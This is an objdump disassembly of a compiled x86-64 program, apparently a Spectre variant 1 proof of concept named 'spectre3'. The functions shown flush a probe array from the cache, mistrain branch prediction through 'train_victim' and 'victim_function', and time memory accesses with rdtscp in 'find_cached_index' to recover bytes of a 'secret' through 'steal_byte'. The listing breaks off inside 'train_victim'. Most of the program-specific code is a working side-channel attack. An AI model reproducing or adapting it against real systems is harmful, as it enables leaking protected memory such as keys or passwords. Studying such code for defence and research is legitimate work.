
spectre3:     file format elf64-x86-64


Disassembly of section .interp:

0000000000000238 <.interp>:
 238:	2f                   	(bad)  
 239:	6c                   	insb   (%dx),%es:(%rdi)
 23a:	69 62 36 34 2f 6c 64 	imul   $0x646c2f34,0x36(%rdx),%esp
 241:	2d 6c 69 6e 75       	sub    $0x756e696c,%eax
 246:	78 2d                	js     275 <_init-0x2eb>
 248:	78 38                	js     282 <_init-0x2de>
 24a:	36 2d 36 34 2e 73    	ss sub $0x732e3436,%eax
 250:	6f                   	outsl  %ds:(%rsi),(%dx)
 251:	2e 32 00             	xor    %cs:(%rax),%al

Disassembly of section .note.ABI-tag:

0000000000000254 <.note.ABI-tag>:
 254:	04 00                	add    $0x0,%al
 256:	00 00                	add    %al,(%rax)
 258:	10 00                	adc    %al,(%rax)
 25a:	00 00                	add    %al,(%rax)
 25c:	01 00                	add    %eax,(%rax)
 25e:	00 00                	add    %al,(%rax)
 260:	47                   	rex.RXB
 261:	4e 55                	rex.WRX push %rbp
 263:	00 00                	add    %al,(%rax)
 265:	00 00                	add    %al,(%rax)
 267:	00 03                	add    %al,(%rbx)
 269:	00 00                	add    %al,(%rax)
 26b:	00 02                	add    %al,(%rdx)
 26d:	00 00                	add    %al,(%rax)
 26f:	00 00                	add    %al,(%rax)
 271:	00 00                	add    %al,(%rax)
	...

Disassembly of section .note.gnu.build-id:

0000000000000274 <.note.gnu.build-id>:
 274:	04 00                	add    $0x0,%al
 276:	00 00                	add    %al,(%rax)
 278:	14 00                	adc    $0x0,%al
 27a:	00 00                	add    %al,(%rax)
 27c:	03 00                	add    (%rax),%eax
 27e:	00 00                	add    %al,(%rax)
 280:	47                   	rex.RXB
 281:	4e 55                	rex.WRX push %rbp
 283:	00 83 10 3d 3a ba    	add    %al,-0x45c5c2f0(%rbx)
 289:	75 04                	jne    28f <_init-0x2d1>
 28b:	91                   	xchg   %eax,%ecx
 28c:	c3                   	retq   
 28d:	ba f8 e3 40 fd       	mov    $0xfd40e3f8,%edx
 292:	2a 53 90             	sub    -0x70(%rbx),%dl
 295:	22 3e                	and    (%rsi),%bh
 297:	fa                   	cli    

Disassembly of section .gnu.hash:

0000000000000298 <.gnu.hash>:
 298:	01 00                	add    %eax,(%rax)
 29a:	00 00                	add    %al,(%rax)
 29c:	01 00                	add    %eax,(%rax)
 29e:	00 00                	add    %al,(%rax)
 2a0:	01 00                	add    %eax,(%rax)
	...

Disassembly of section .dynsym:

00000000000002b8 <.dynsym>:
	...
 2d0:	3a 00                	cmp    (%rax),%al
 2d2:	00 00                	add    %al,(%rax)
 2d4:	12 00                	adc    (%rax),%al
	...
 2e6:	00 00                	add    %al,(%rax)
 2e8:	4b 00 00             	rex.WXB add %al,(%r8)
 2eb:	00 20                	add    %ah,(%rax)
	...
 2fd:	00 00                	add    %al,(%rax)
 2ff:	00 0b                	add    %cl,(%rbx)
 301:	00 00                	add    %al,(%rax)
 303:	00 12                	add    %dl,(%rdx)
	...
 315:	00 00                	add    %al,(%rax)
 317:	00 28                	add    %ch,(%rax)
 319:	00 00                	add    %al,(%rax)
 31b:	00 12                	add    %dl,(%rdx)
	...
 32d:	00 00                	add    %al,(%rax)
 32f:	00 67 00             	add    %ah,0x0(%rdi)
 332:	00 00                	add    %al,(%rax)
 334:	20 00                	and    %al,(%rax)
	...
 346:	00 00                	add    %al,(%rax)
 348:	12 00                	adc    (%rax),%al
 34a:	00 00                	add    %al,(%rax)
 34c:	12 00                	adc    (%rax),%al
	...
 35e:	00 00                	add    %al,(%rax)
 360:	76 00                	jbe    362 <_init-0x1fe>
 362:	00 00                	add    %al,(%rax)
 364:	20 00                	and    %al,(%rax)
	...
 376:	00 00                	add    %al,(%rax)
 378:	19 00                	sbb    %eax,(%rax)
 37a:	00 00                	add    %al,(%rax)
 37c:	22 00                	and    (%rax),%al
	...

Disassembly of section .dynstr:

0000000000000390 <.dynstr>:
 390:	00 6c 69 62          	add    %ch,0x62(%rcx,%rbp,2)
 394:	63 2e                	movslq (%rsi),%ebp
 396:	73 6f                	jae    407 <_init-0x159>
 398:	2e 36 00 70 72       	cs add %dh,%ss:0x72(%rax)
 39d:	69 6e 74 66 00 6d 61 	imul   $0x616d0066,0x74(%rsi),%ebp
 3a4:	6c                   	insb   (%dx),%es:(%rdi)
 3a5:	6c                   	insb   (%dx),%es:(%rdi)
 3a6:	6f                   	outsl  %ds:(%rsi),(%dx)
 3a7:	63 00                	movslq (%rax),%eax
 3a9:	5f                   	pop    %rdi
 3aa:	5f                   	pop    %rdi
 3ab:	63 78 61             	movslq 0x61(%rax),%edi
 3ae:	5f                   	pop    %rdi
 3af:	66 69 6e 61 6c 69    	imul   $0x696c,0x61(%rsi),%bp
 3b5:	7a 65                	jp     41c <_init-0x144>
 3b7:	00 5f 5f             	add    %bl,0x5f(%rdi)
 3ba:	6c                   	insb   (%dx),%es:(%rdi)
 3bb:	69 62 63 5f 73 74 61 	imul   $0x6174735f,0x63(%rdx),%esp
 3c2:	72 74                	jb     438 <_init-0x128>
 3c4:	5f                   	pop    %rdi
 3c5:	6d                   	insl   (%dx),%es:(%rdi)
 3c6:	61                   	(bad)  
 3c7:	69 6e 00 66 72 65 65 	imul   $0x65657266,0x0(%rsi),%ebp
 3ce:	00 47 4c             	add    %al,0x4c(%rdi)
 3d1:	49                   	rex.WB
 3d2:	42                   	rex.X
 3d3:	43 5f                	rex.XB pop %r15
 3d5:	32 2e                	xor    (%rsi),%ch
 3d7:	32 2e                	xor    (%rsi),%ch
 3d9:	35 00 5f 49 54       	xor    $0x54495f00,%eax
 3de:	4d 5f                	rex.WRB pop %r15
 3e0:	64 65 72 65          	fs gs jb 449 <_init-0x117>
 3e4:	67 69 73 74 65 72 54 	imul   $0x4d547265,0x74(%ebx),%esi
 3eb:	4d 
 3ec:	43 6c                	rex.XB insb (%dx),%es:(%rdi)
 3ee:	6f                   	outsl  %ds:(%rsi),(%dx)
 3ef:	6e                   	outsb  %ds:(%rsi),(%dx)
 3f0:	65 54                	gs push %rsp
 3f2:	61                   	(bad)  
 3f3:	62                   	(bad)  
 3f4:	6c                   	insb   (%dx),%es:(%rdi)
 3f5:	65 00 5f 5f          	add    %bl,%gs:0x5f(%rdi)
 3f9:	67 6d                	insl   (%dx),%es:(%edi)
 3fb:	6f                   	outsl  %ds:(%rsi),(%dx)
 3fc:	6e                   	outsb  %ds:(%rsi),(%dx)
 3fd:	5f                   	pop    %rdi
 3fe:	73 74                	jae    474 <_init-0xec>
 400:	61                   	(bad)  
 401:	72 74                	jb     477 <_init-0xe9>
 403:	5f                   	pop    %rdi
 404:	5f                   	pop    %rdi
 405:	00 5f 49             	add    %bl,0x49(%rdi)
 408:	54                   	push   %rsp
 409:	4d 5f                	rex.WRB pop %r15
 40b:	72 65                	jb     472 <_init-0xee>
 40d:	67 69 73 74 65 72 54 	imul   $0x4d547265,0x74(%ebx),%esi
 414:	4d 
 415:	43 6c                	rex.XB insb (%dx),%es:(%rdi)
 417:	6f                   	outsl  %ds:(%rsi),(%dx)
 418:	6e                   	outsb  %ds:(%rsi),(%dx)
 419:	65 54                	gs push %rsp
 41b:	61                   	(bad)  
 41c:	62                   	.byte 0x62
 41d:	6c                   	insb   (%dx),%es:(%rdi)
 41e:	65                   	gs
	...

Disassembly of section .gnu.version:

0000000000000420 <.gnu.version>:
 420:	00 00                	add    %al,(%rax)
 422:	02 00                	add    (%rax),%al
 424:	00 00                	add    %al,(%rax)
 426:	02 00                	add    (%rax),%al
 428:	02 00                	add    (%rax),%al
 42a:	00 00                	add    %al,(%rax)
 42c:	02 00                	add    (%rax),%al
 42e:	00 00                	add    %al,(%rax)
 430:	02 00                	add    (%rax),%al

Disassembly of section .gnu.version_r:

0000000000000438 <.gnu.version_r>:
 438:	01 00                	add    %eax,(%rax)
 43a:	01 00                	add    %eax,(%rax)
 43c:	01 00                	add    %eax,(%rax)
 43e:	00 00                	add    %al,(%rax)
 440:	10 00                	adc    %al,(%rax)
 442:	00 00                	add    %al,(%rax)
 444:	00 00                	add    %al,(%rax)
 446:	00 00                	add    %al,(%rax)
 448:	75 1a                	jne    464 <_init-0xfc>
 44a:	69 09 00 00 02 00    	imul   $0x20000,(%rcx),%ecx
 450:	3f                   	(bad)  
 451:	00 00                	add    %al,(%rax)
 453:	00 00                	add    %al,(%rax)
 455:	00 00                	add    %al,(%rax)
	...

Disassembly of section .rela.dyn:

0000000000000458 <.rela.dyn>:
 458:	a8 0d                	test   $0xd,%al
 45a:	20 00                	and    %al,(%rax)
 45c:	00 00                	add    %al,(%rax)
 45e:	00 00                	add    %al,(%rax)
 460:	08 00                	or     %al,(%rax)
 462:	00 00                	add    %al,(%rax)
 464:	00 00                	add    %al,(%rax)
 466:	00 00                	add    %al,(%rax)
 468:	d0 06                	rolb   (%rsi)
 46a:	00 00                	add    %al,(%rax)
 46c:	00 00                	add    %al,(%rax)
 46e:	00 00                	add    %al,(%rax)
 470:	b0 0d                	mov    $0xd,%al
 472:	20 00                	and    %al,(%rax)
 474:	00 00                	add    %al,(%rax)
 476:	00 00                	add    %al,(%rax)
 478:	08 00                	or     %al,(%rax)
 47a:	00 00                	add    %al,(%rax)
 47c:	00 00                	add    %al,(%rax)
 47e:	00 00                	add    %al,(%rax)
 480:	90                   	nop
 481:	06                   	(bad)  
 482:	00 00                	add    %al,(%rax)
 484:	00 00                	add    %al,(%rax)
 486:	00 00                	add    %al,(%rax)
 488:	08 10                	or     %dl,(%rax)
 48a:	20 00                	and    %al,(%rax)
 48c:	00 00                	add    %al,(%rax)
 48e:	00 00                	add    %al,(%rax)
 490:	08 00                	or     %al,(%rax)
 492:	00 00                	add    %al,(%rax)
 494:	00 00                	add    %al,(%rax)
 496:	00 00                	add    %al,(%rax)
 498:	08 10                	or     %dl,(%rax)
 49a:	20 00                	and    %al,(%rax)
 49c:	00 00                	add    %al,(%rax)
 49e:	00 00                	add    %al,(%rax)
 4a0:	d8 0f                	fmuls  (%rdi)
 4a2:	20 00                	and    %al,(%rax)
 4a4:	00 00                	add    %al,(%rax)
 4a6:	00 00                	add    %al,(%rax)
 4a8:	06                   	(bad)  
 4a9:	00 00                	add    %al,(%rax)
 4ab:	00 02                	add    %al,(%rdx)
	...
 4b5:	00 00                	add    %al,(%rax)
 4b7:	00 e0                	add    %ah,%al
 4b9:	0f 20 00             	mov    %cr0,%rax
 4bc:	00 00                	add    %al,(%rax)
 4be:	00 00                	add    %al,(%rax)
 4c0:	06                   	(bad)  
 4c1:	00 00                	add    %al,(%rax)
 4c3:	00 04 00             	add    %al,(%rax,%rax,1)
	...
 4ce:	00 00                	add    %al,(%rax)
 4d0:	e8 0f 20 00 00       	callq  24e4 <__FRAME_END__+0x1788>
 4d5:	00 00                	add    %al,(%rax)
 4d7:	00 06                	add    %al,(%rsi)
 4d9:	00 00                	add    %al,(%rax)
 4db:	00 05 00 00 00 00    	add    %al,0x0(%rip)        # 4e1 <_init-0x7f>
 4e1:	00 00                	add    %al,(%rax)
 4e3:	00 00                	add    %al,(%rax)
 4e5:	00 00                	add    %al,(%rax)
 4e7:	00 f0                	add    %dh,%al
 4e9:	0f 20 00             	mov    %cr0,%rax
 4ec:	00 00                	add    %al,(%rax)
 4ee:	00 00                	add    %al,(%rax)
 4f0:	06                   	(bad)  
 4f1:	00 00                	add    %al,(%rax)
 4f3:	00 07                	add    %al,(%rdi)
	...
 4fd:	00 00                	add    %al,(%rax)
 4ff:	00 f8                	add    %bh,%al
 501:	0f 20 00             	mov    %cr0,%rax
 504:	00 00                	add    %al,(%rax)
 506:	00 00                	add    %al,(%rax)
 508:	06                   	(bad)  
 509:	00 00                	add    %al,(%rax)
 50b:	00 08                	add    %cl,(%rax)
	...

Disassembly of section .rela.plt:

0000000000000518 <.rela.plt>:
 518:	c0 0f 20             	rorb   $0x20,(%rdi)
 51b:	00 00                	add    %al,(%rax)
 51d:	00 00                	add    %al,(%rax)
 51f:	00 07                	add    %al,(%rdi)
 521:	00 00                	add    %al,(%rax)
 523:	00 01                	add    %al,(%rcx)
	...
 52d:	00 00                	add    %al,(%rax)
 52f:	00 c8                	add    %cl,%al
 531:	0f 20 00             	mov    %cr0,%rax
 534:	00 00                	add    %al,(%rax)
 536:	00 00                	add    %al,(%rax)
 538:	07                   	(bad)  
 539:	00 00                	add    %al,(%rax)
 53b:	00 03                	add    %al,(%rbx)
	...
 545:	00 00                	add    %al,(%rax)
 547:	00 d0                	add    %dl,%al
 549:	0f 20 00             	mov    %cr0,%rax
 54c:	00 00                	add    %al,(%rax)
 54e:	00 00                	add    %al,(%rax)
 550:	07                   	(bad)  
 551:	00 00                	add    %al,(%rax)
 553:	00 06                	add    %al,(%rsi)
	...

Disassembly of section .init:

0000000000000560 <_init>:
 560:	48 83 ec 08          	sub    $0x8,%rsp
 564:	48 8b 05 7d 0a 20 00 	mov    0x200a7d(%rip),%rax        # 200fe8 <__gmon_start__>
 56b:	48 85 c0             	test   %rax,%rax
 56e:	74 02                	je     572 <_init+0x12>
 570:	ff d0                	callq  *%rax
 572:	48 83 c4 08          	add    $0x8,%rsp
 576:	c3                   	retq   

Disassembly of section .plt:

0000000000000580 <.plt>:
 580:	ff 35 2a 0a 20 00    	pushq  0x200a2a(%rip)        # 200fb0 <_GLOBAL_OFFSET_TABLE_+0x8>
 586:	ff 25 2c 0a 20 00    	jmpq   *0x200a2c(%rip)        # 200fb8 <_GLOBAL_OFFSET_TABLE_+0x10>
 58c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000000590 <free@plt>:
 590:	ff 25 2a 0a 20 00    	jmpq   *0x200a2a(%rip)        # 200fc0 <free@GLIBC_2.2.5>
 596:	68 00 00 00 00       	pushq  $0x0
 59b:	e9 e0 ff ff ff       	jmpq   580 <.plt>

00000000000005a0 <printf@plt>:
 5a0:	ff 25 22 0a 20 00    	jmpq   *0x200a22(%rip)        # 200fc8 <printf@GLIBC_2.2.5>
 5a6:	68 01 00 00 00       	pushq  $0x1
 5ab:	e9 d0 ff ff ff       	jmpq   580 <.plt>

00000000000005b0 <malloc@plt>:
 5b0:	ff 25 1a 0a 20 00    	jmpq   *0x200a1a(%rip)        # 200fd0 <malloc@GLIBC_2.2.5>
 5b6:	68 02 00 00 00       	pushq  $0x2
 5bb:	e9 c0 ff ff ff       	jmpq   580 <.plt>

Disassembly of section .plt.got:

00000000000005c0 <__cxa_finalize@plt>:
 5c0:	ff 25 32 0a 20 00    	jmpq   *0x200a32(%rip)        # 200ff8 <__cxa_finalize@GLIBC_2.2.5>
 5c6:	66 90                	xchg   %ax,%ax

Disassembly of section .text:

00000000000005d0 <_start>:
 5d0:	31 ed                	xor    %ebp,%ebp
 5d2:	49 89 d1             	mov    %rdx,%r9
 5d5:	5e                   	pop    %rsi
 5d6:	48 89 e2             	mov    %rsp,%rdx
 5d9:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
 5dd:	50                   	push   %rax
 5de:	54                   	push   %rsp
 5df:	4c 8d 05 fa 04 00 00 	lea    0x4fa(%rip),%r8        # ae0 <__libc_csu_fini>
 5e6:	48 8d 0d 83 04 00 00 	lea    0x483(%rip),%rcx        # a70 <__libc_csu_init>
 5ed:	48 8d 3d e6 00 00 00 	lea    0xe6(%rip),%rdi        # 6da <main>
 5f4:	ff 15 e6 09 20 00    	callq  *0x2009e6(%rip)        # 200fe0 <__libc_start_main@GLIBC_2.2.5>
 5fa:	f4                   	hlt    
 5fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000000600 <deregister_tm_clones>:
 600:	48 8d 3d 09 0b 20 00 	lea    0x200b09(%rip),%rdi        # 201110 <__TMC_END__>
 607:	55                   	push   %rbp
 608:	48 8d 05 01 0b 20 00 	lea    0x200b01(%rip),%rax        # 201110 <__TMC_END__>
 60f:	48 39 f8             	cmp    %rdi,%rax
 612:	48 89 e5             	mov    %rsp,%rbp
 615:	74 19                	je     630 <deregister_tm_clones+0x30>
 617:	48 8b 05 ba 09 20 00 	mov    0x2009ba(%rip),%rax        # 200fd8 <_ITM_deregisterTMCloneTable>
 61e:	48 85 c0             	test   %rax,%rax
 621:	74 0d                	je     630 <deregister_tm_clones+0x30>
 623:	5d                   	pop    %rbp
 624:	ff e0                	jmpq   *%rax
 626:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 62d:	00 00 00 
 630:	5d                   	pop    %rbp
 631:	c3                   	retq   
 632:	0f 1f 40 00          	nopl   0x0(%rax)
 636:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 63d:	00 00 00 

0000000000000640 <register_tm_clones>:
 640:	48 8d 3d c9 0a 20 00 	lea    0x200ac9(%rip),%rdi        # 201110 <__TMC_END__>
 647:	48 8d 35 c2 0a 20 00 	lea    0x200ac2(%rip),%rsi        # 201110 <__TMC_END__>
 64e:	55                   	push   %rbp
 64f:	48 29 fe             	sub    %rdi,%rsi
 652:	48 89 e5             	mov    %rsp,%rbp
 655:	48 c1 fe 03          	sar    $0x3,%rsi
 659:	48 89 f0             	mov    %rsi,%rax
 65c:	48 c1 e8 3f          	shr    $0x3f,%rax
 660:	48 01 c6             	add    %rax,%rsi
 663:	48 d1 fe             	sar    %rsi
 666:	74 18                	je     680 <register_tm_clones+0x40>
 668:	48 8b 05 81 09 20 00 	mov    0x200981(%rip),%rax        # 200ff0 <_ITM_registerTMCloneTable>
 66f:	48 85 c0             	test   %rax,%rax
 672:	74 0c                	je     680 <register_tm_clones+0x40>
 674:	5d                   	pop    %rbp
 675:	ff e0                	jmpq   *%rax
 677:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
 67e:	00 00 
 680:	5d                   	pop    %rbp
 681:	c3                   	retq   
 682:	0f 1f 40 00          	nopl   0x0(%rax)
 686:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 68d:	00 00 00 

0000000000000690 <__do_global_dtors_aux>:
 690:	80 3d 89 0a 20 00 00 	cmpb   $0x0,0x200a89(%rip)        # 201120 <completed.7697>
 697:	75 2f                	jne    6c8 <__do_global_dtors_aux+0x38>
 699:	48 83 3d 57 09 20 00 	cmpq   $0x0,0x200957(%rip)        # 200ff8 <__cxa_finalize@GLIBC_2.2.5>
 6a0:	00 
 6a1:	55                   	push   %rbp
 6a2:	48 89 e5             	mov    %rsp,%rbp
 6a5:	74 0c                	je     6b3 <__do_global_dtors_aux+0x23>
 6a7:	48 8b 3d 5a 09 20 00 	mov    0x20095a(%rip),%rdi        # 201008 <__dso_handle>
 6ae:	e8 0d ff ff ff       	callq  5c0 <__cxa_finalize@plt>
 6b3:	e8 48 ff ff ff       	callq  600 <deregister_tm_clones>
 6b8:	c6 05 61 0a 20 00 01 	movb   $0x1,0x200a61(%rip)        # 201120 <completed.7697>
 6bf:	5d                   	pop    %rbp
 6c0:	c3                   	retq   
 6c1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
 6c8:	f3 c3                	repz retq 
 6ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

00000000000006d0 <frame_dummy>:
 6d0:	55                   	push   %rbp
 6d1:	48 89 e5             	mov    %rsp,%rbp
 6d4:	5d                   	pop    %rbp
 6d5:	e9 66 ff ff ff       	jmpq   640 <register_tm_clones>

00000000000006da <main>:
 6da:	55                   	push   %rbp
 6db:	48 89 e5             	mov    %rsp,%rbp
 6de:	48 83 ec 20          	sub    $0x20,%rsp
 6e2:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%rbp)
 6e9:	eb 24                	jmp    70f <main+0x35>
 6eb:	8b 45 e0             	mov    -0x20(%rbp),%eax
 6ee:	99                   	cltd   
 6ef:	c1 ea 18             	shr    $0x18,%edx
 6f2:	01 d0                	add    %edx,%eax
 6f4:	0f b6 c0             	movzbl %al,%eax
 6f7:	29 d0                	sub    %edx,%eax
 6f9:	89 c1                	mov    %eax,%ecx
 6fb:	8b 45 e0             	mov    -0x20(%rbp),%eax
 6fe:	48 63 d0             	movslq %eax,%rdx
 701:	48 8d 05 38 0a 20 00 	lea    0x200a38(%rip),%rax        # 201140 <array>
 708:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
 70b:	83 45 e0 01          	addl   $0x1,-0x20(%rbp)
 70f:	81 7d e0 ff ff 0f 00 	cmpl   $0xfffff,-0x20(%rbp)
 716:	7e d3                	jle    6eb <main+0x11>
 718:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
 71f:	e9 b1 00 00 00       	jmpq   7d5 <main+0xfb>
 724:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
 72b:	eb 1a                	jmp    747 <main+0x6d>
 72d:	8b 45 e8             	mov    -0x18(%rbp),%eax
 730:	c1 e0 0c             	shl    $0xc,%eax
 733:	48 63 d0             	movslq %eax,%rdx
 736:	48 8d 05 03 0a 20 00 	lea    0x200a03(%rip),%rax        # 201140 <array>
 73d:	48 01 d0             	add    %rdx,%rax
 740:	0f ae 38             	clflush (%rax)
 743:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
 747:	81 7d e8 ff 00 00 00 	cmpl   $0xff,-0x18(%rbp)
 74e:	7e dd                	jle    72d <main+0x53>
 750:	0f ae f0             	mfence 
 753:	bf 00 04 00 00       	mov    $0x400,%edi
 758:	e8 53 fe ff ff       	callq  5b0 <malloc@plt>
 75d:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 761:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
 768:	eb 1e                	jmp    788 <main+0xae>
 76a:	8b 45 ec             	mov    -0x14(%rbp),%eax
 76d:	48 98                	cltq   
 76f:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 776:	00 
 777:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 77b:	48 01 d0             	add    %rdx,%rax
 77e:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
 784:	83 45 ec 01          	addl   $0x1,-0x14(%rbp)
 788:	81 7d ec ff 00 00 00 	cmpl   $0xff,-0x14(%rbp)
 78f:	7e d9                	jle    76a <main+0x90>
 791:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 794:	48 98                	cltq   
 796:	48 8d 0d 43 09 20 00 	lea    0x200943(%rip),%rcx        # 2010e0 <secret>
 79d:	48 8d 15 9c 08 20 00 	lea    0x20089c(%rip),%rdx        # 201040 <buffer>
 7a4:	48 29 d1             	sub    %rdx,%rcx
 7a7:	48 89 ca             	mov    %rcx,%rdx
 7aa:	48 01 d0             	add    %rdx,%rax
 7ad:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 7b1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 7b5:	89 c2                	mov    %eax,%edx
 7b7:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 7bb:	89 d6                	mov    %edx,%esi
 7bd:	48 89 c7             	mov    %rax,%rdi
 7c0:	e8 e4 01 00 00       	callq  9a9 <steal_byte>
 7c5:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 7c9:	48 89 c7             	mov    %rax,%rdi
 7cc:	e8 bf fd ff ff       	callq  590 <free@plt>
 7d1:	83 45 e4 01          	addl   $0x1,-0x1c(%rbp)
 7d5:	83 7d e4 27          	cmpl   $0x27,-0x1c(%rbp)
 7d9:	0f 8e 45 ff ff ff    	jle    724 <main+0x4a>
 7df:	b8 00 00 00 00       	mov    $0x0,%eax
 7e4:	c9                   	leaveq 
 7e5:	c3                   	retq   

00000000000007e6 <find_cached_index>:
 7e6:	55                   	push   %rbp
 7e7:	48 89 e5             	mov    %rsp,%rbp
 7ea:	53                   	push   %rbx
 7eb:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
 7ef:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
 7f6:	eb 5a                	jmp    852 <find_cached_index+0x6c>
 7f8:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
 7ff:	00 
 800:	8b 45 ec             	mov    -0x14(%rbp),%eax
 803:	c1 e0 0c             	shl    $0xc,%eax
 806:	48 63 d0             	movslq %eax,%rdx
 809:	48 8d 05 30 09 20 00 	lea    0x200930(%rip),%rax        # 201140 <array>
 810:	48 01 d0             	add    %rdx,%rax
 813:	48 89 c3             	mov    %rax,%rbx
 816:	0f ae f0             	mfence 
 819:	0f 01 f9             	rdtscp 
 81c:	49 89 c2             	mov    %rax,%r10
 81f:	48 8b 0b             	mov    (%rbx),%rcx
 822:	0f 01 f9             	rdtscp 
 825:	4c 29 d0             	sub    %r10,%rax
 828:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 82c:	48 83 7d f0 77       	cmpq   $0x77,-0x10(%rbp)
 831:	77 1b                	ja     84e <find_cached_index+0x68>
 833:	8b 45 ec             	mov    -0x14(%rbp),%eax
 836:	48 98                	cltq   
 838:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 83f:	00 
 840:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
 844:	48 01 d0             	add    %rdx,%rax
 847:	8b 10                	mov    (%rax),%edx
 849:	83 c2 01             	add    $0x1,%edx
 84c:	89 10                	mov    %edx,(%rax)
 84e:	83 45 ec 01          	addl   $0x1,-0x14(%rbp)
 852:	81 7d ec ff 00 00 00 	cmpl   $0xff,-0x14(%rbp)
 859:	7e 9d                	jle    7f8 <find_cached_index+0x12>
 85b:	90                   	nop
 85c:	5b                   	pop    %rbx
 85d:	5d                   	pop    %rbp
 85e:	c3                   	retq   

000000000000085f <find_highest_score>:
 85f:	55                   	push   %rbp
 860:	48 89 e5             	mov    %rsp,%rbp
 863:	48 83 ec 20          	sub    $0x20,%rsp
 867:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
 86b:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
 872:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 879:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%rbp)
 880:	eb 3e                	jmp    8c0 <find_highest_score+0x61>
 882:	8b 45 fc             	mov    -0x4(%rbp),%eax
 885:	48 98                	cltq   
 887:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 88e:	00 
 88f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 893:	48 01 d0             	add    %rdx,%rax
 896:	8b 00                	mov    (%rax),%eax
 898:	39 45 f4             	cmp    %eax,-0xc(%rbp)
 89b:	7d 1f                	jge    8bc <find_highest_score+0x5d>
 89d:	8b 45 fc             	mov    -0x4(%rbp),%eax
 8a0:	89 45 f8             	mov    %eax,-0x8(%rbp)
 8a3:	8b 45 fc             	mov    -0x4(%rbp),%eax
 8a6:	48 98                	cltq   
 8a8:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 8af:	00 
 8b0:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 8b4:	48 01 d0             	add    %rdx,%rax
 8b7:	8b 00                	mov    (%rax),%eax
 8b9:	89 45 f4             	mov    %eax,-0xc(%rbp)
 8bc:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 8c0:	81 7d fc ff 00 00 00 	cmpl   $0xff,-0x4(%rbp)
 8c7:	7e b9                	jle    882 <find_highest_score+0x23>
 8c9:	8b 4d f4             	mov    -0xc(%rbp),%ecx
 8cc:	8b 55 f8             	mov    -0x8(%rbp),%edx
 8cf:	8b 45 f8             	mov    -0x8(%rbp),%eax
 8d2:	89 c6                	mov    %eax,%esi
 8d4:	48 8d 3d 1d 02 00 00 	lea    0x21d(%rip),%rdi        # af8 <_IO_stdin_used+0x8>
 8db:	b8 00 00 00 00       	mov    $0x0,%eax
 8e0:	e8 bb fc ff ff       	callq  5a0 <printf@plt>
 8e5:	90                   	nop
 8e6:	c9                   	leaveq 
 8e7:	c3                   	retq   

00000000000008e8 <train_victim>:
 8e8:	55                   	push   %rbp
 8e9:	48 89 e5             	mov    %rsp,%rbp
 8ec:	48 83 ec 10          	sub    $0x10,%rsp
 8f0:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
 8f7:	eb 6b                	jmp    964 <train_victim+0x7c>
 8f9:	8b 4d f4             	mov    -0xc(%rbp),%ecx
 8fc:	ba 67 66 66 66       	mov    $0x66666667,%edx
 901:	89 c8                	mov    %ecx,%eax
 903:	f7 ea                	imul   %edx
 905:	c1 fa 02             	sar    $0x2,%edx
 908:	89 c8                	mov    %ecx,%eax
 90a:	c1 f8 1f             	sar    $0x1f,%eax
 90d:	29 c2                	sub    %eax,%edx
 90f:	89 d0                	mov    %edx,%eax
 911:	c1 e0 02             	shl    $0x2,%eax
 914:	01 d0                	add    %edx,%eax
 916:	01 c0                	add    %eax,%eax
 918:	29 c1                	sub    %eax,%ecx
 91a:	89 ca                	mov    %ecx,%edx
 91c:	48 63 c2             	movslq %edx,%rax
 91f:	48 89 c7             	mov    %rax,%rdi
 922:	e8 09 01 00 00       	callq  a30 <victim_function>
 927:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 92e:	eb 1a                	jmp    94a <train_victim+0x62>
 930:	8b 45 f8             	mov    -0x8(%rbp),%eax
 933:	c1 e0 0c             	shl    $0xc,%eax
 936:	48 63 d0             	movslq %eax,%rdx
 939:	48 8d 05 00 08 20 00 	lea    0x200800(%rip),%rax        # 201140 <array>
 940:	48 01 d0             	add    %rdx,%rax
 943:	0f ae 38             	clflush (%rax)
 946:	83 45 f8 01          	addl   $0x1,-0x8(%rbp)
 94a:	81 7d f8 ff 00 00 00 	cmpl   $0xff,-0x8(%rbp)
 951:	7e dd                	jle    930 <train_victim+0x48>
 953:	0f ae f0             	mfence 
